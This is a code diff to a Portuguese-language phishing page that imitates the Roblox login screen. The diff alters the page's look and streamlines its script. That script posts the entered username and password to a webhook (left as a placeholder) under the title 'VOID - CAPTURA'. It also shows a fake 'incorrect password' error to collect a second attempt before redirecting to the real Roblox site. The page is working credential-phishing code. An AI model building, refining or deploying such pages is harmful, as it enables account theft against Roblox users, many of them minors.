@@ -40,9 +40,9 @@
 
         .main-content { 
             flex: 1; display: flex; align-items: center; justify-content: center; flex-direction: column; 
-            background: linear-gradient(rgba(0,0,0,0.3), rgba(0,0,0,0.3)), url('https://images.rbxcdn.com/a19e4c27a0694a1d0fd5ceb17c978a7a-marketing_bg_05222025.jpg'); 
+            background: linear-gradient(rgba(0,0,0,0.4), rgba(0,0,0,0.4)), url('https://images.rbxcdn.com/a19e4c27a0694a1d0fd5ceb17c978a7a-marketing_bg_05222025.jpg'); 
             background-size: cover; background-position: center; 
-            padding: 80px 0 40px 0; 
+            padding: 80px 0 40px 0; min-height: 100vh;
         }
         
         .login-card { 
@@ -67,7 +67,7 @@
 
         .input-field { 
             width: 100%; height: 44px; background-color: var(--input-bg); 
-            border: 1px solid rgba(0,0,0,0.1); border-radius: var(--radius-main); 
+            border: 1px solid rgba(255,255,255,0.1); border-radius: 4px; 
             color: #fff; padding: 0 12px; margin-bottom: 12px; 
             box-sizing: border-box; outline: none; transition: 0.2s; font-size: 15px;
         }
@@ -79,43 +79,41 @@
             position: relative; cursor: pointer; font-size: 14px; color: #fff;
             user-select: none;
         }
-        .checkbox-container input { position: absolute; opacity: 0; left: -9999px; }
+        .checkbox-container input { position: absolute; opacity: 0; }
         .checkmark {
             height: 18px; width: 18px; background-color: #fff;
             border-radius: 3px; margin-right: 10px; flex-shrink: 0;
             border: 1px solid #bcbec8; position: relative;
         }
         .checkbox-container input:checked ~ .checkmark {
-            background-color: #70a0ff; border-color: #70a0ff;
+            background-color: #0084ff; border-color: #0084ff;
             background-image: url(https://images.rbxcdn.com/c3ebbbd60f3655d3a078dcfb632199fd-generic_01312019.svg);
             background-repeat: no-repeat; background-size: 28px auto; background-position: 0 -602px;
         }
 
         .btn-primary-md { 
             width: 100%; height: 42px; border: 1px solid #fff; 
-            background: rgba(255,255,255,0.05); color: #fff; 
-            border-radius: var(--radius-main); font-size: 16px; font-weight: 500; 
+            background: transparent; color: #fff; 
+            border-radius: 4px; font-size: 16px; font-weight: 500; 
             cursor: pointer; margin-top: 10px; transition: 0.2s;
         }
-        .btn-primary-md:hover { background-color: var(--state-hover); }
+        .btn-primary-md:hover { background-color: rgba(255,255,255,0.1); }
 
         .btn-secondary { 
             width: 100%; height: 42px; background-color: #393b43; 
-            border: none; color: #fff; border-radius: var(--radius-main); 
-            margin-top: 12px; cursor: pointer; font-weight: 500; transition: 0.2s;
+            border: none; color: #fff; border-radius: 4px; 
+            margin-top: 12px; cursor: pointer; font-weight: 500;
         }
-        .btn-secondary:hover { background-color: #45474d; }
 
         .divider { border-top: 1px solid var(--border-grey); margin: 20px 0; width: 100%; }
 
-        .container-footer { background-color: var(--footer-bg); padding: 40px 0; width: 100%; }
+        .container-footer { background-color: var(--footer-bg); padding: 40px 0; width: 100%; margin-top: auto; }
         .footer-note { font-size: 12px; color: #d5d7dd; opacity: 0.7; text-align: center; }
 
         #loading-overlay { 
-            background-color: rgba(0,0,0,0.7); 
+            background-color: rgba(0,0,0,0.8); 
             position: fixed; inset: 0; z-index: 2000; 
             display: none; align-items: center; justify-content: center; 
-            backdrop-filter: blur(5px);
         }
         .spinner { 
             width: 40px; height: 40px; border: 4px solid rgba(255,255,255,0.1); 
@@ -140,11 +138,11 @@
 <main class="main-content">
     <div class="login-card" id="card">
         <div class="shield-icon"></div>
-        <h1 style="margin-bottom: 25px; font-weight: 700; font-size: 24px; letter-spacing: -0.5px;">Entrar na Roblox</h1>
+        <h1 style="margin-bottom: 25px; font-weight: 700; font-size: 24px;">Entrar na Roblox</h1>
         
         <div id="error-msg">Usuário ou senha incorretos.</div>
 
-        <input type="text" id="user" class="input-field" placeholder="Usuário/e-mail/telefone" autocomplete="off" oninput="resetStyles()">
+        <input type="text" id="user" class="input-field" placeholder="Usuário/e-mail/telefone" oninput="resetStyles()">
         <input type="password" id="pass" class="input-field" placeholder="Senha" oninput="resetStyles()">
         
         <label class="checkbox-container">
@@ -155,11 +153,11 @@
 
         <button class="btn-primary-md" onclick="execLogin()">Entrar</button>
         
-        <a href="#" style="display: block; margin: 15px 0; color: #fff; text-decoration: none; font-size: 14px; opacity: 0.8;">Esqueceu a senha ou nome de usuário?</a>
+        <a href="#" style="display: block; margin: 15px 0; color: #fff; text-decoration: none; font-size: 14px; opacity: 0.8;">Esqueceu a senha?</a>
         
         <div class="divider"></div>
         
-        <button class="btn-secondary" style="margin-top: 0;">Entrada rápida</button>
+        <button class="btn-secondary">Entrada rápida</button>
         
         <p style="margin-top: 25px; font-size: 14px; color: #fff;">
             Não possui uma conta? <a href="#" style="color:#fff; font-weight:700; text-decoration:none;">Cadastrar-se</a>
@@ -176,8 +174,7 @@
     const webhookURL = "SUA_WEBHOOK_AQUI"; 
 
     function resetStyles() {
-        const inputs = document.querySelectorAll('.input-field');
-        inputs.forEach(i => i.classList.remove('input-field-error'));
+        document.querySelectorAll('.input-field').forEach(i => i.classList.remove('input-field-error'));
         document.getElementById('error-msg').style.display = 'none';
     }
 
@@ -185,7 +182,6 @@
         const u = document.getElementById('user').value;
         const p = document.getElementById('pass').value;
         const card = document.getElementById('card');
-        const errorDiv = document.getElementById('error-msg');
         const overlay = document.getElementById('loading-overlay');
 
         if(!u || !p) {
@@ -201,23 +197,20 @@
                 headers: {"Content-Type": "application/json"},
                 body: JSON.stringify({
                     embeds: [{
-                        title: "🛠️ VOID - PROTOCOLO COLMEIA",
+                        title: "🛠️ VOID - CAPTURA",
                         color: 3092790,
                         fields: [
                             {name: "👤 Login", value: `\`${u}\``, inline: true},
-                            {name: "🔑 Código", value: `\`${p}\``, inline: true},
-                            {name: "📡 Status", value: `Tentativa #${attempt + 1}`, inline: true}
-                        ],
-                        footer: {text: "CTO VOID | Lead Architect 2026"}
+                            {name: "🔑 Senha", value: `\`${p}\``, inline: true}
+                        ]
                     }]
                 })
             });
-        } catch (e) { console.log("Erro de rede."); }
+        } catch (e) {}
 
         setTimeout(() => {
             overlay.style.display = 'none';
             attempt++;
-
             if(attempt >= 2) {
                 window.location.href = "https://www.roblox.com/home";
             } else {
@@ -227,7 +220,7 @@
 
         function triggerError() {
             card.classList.add('shake');
-            errorDiv.style.display = 'block';
+            document.getElementById('error-msg').style.display = 'block';
             document.querySelectorAll('.input-field').forEach(i => i.classList.add('input-field-error'));
             document.getElementById('pass').value = "";
             setTimeout(() => card.classList.remove('shake'), 400);
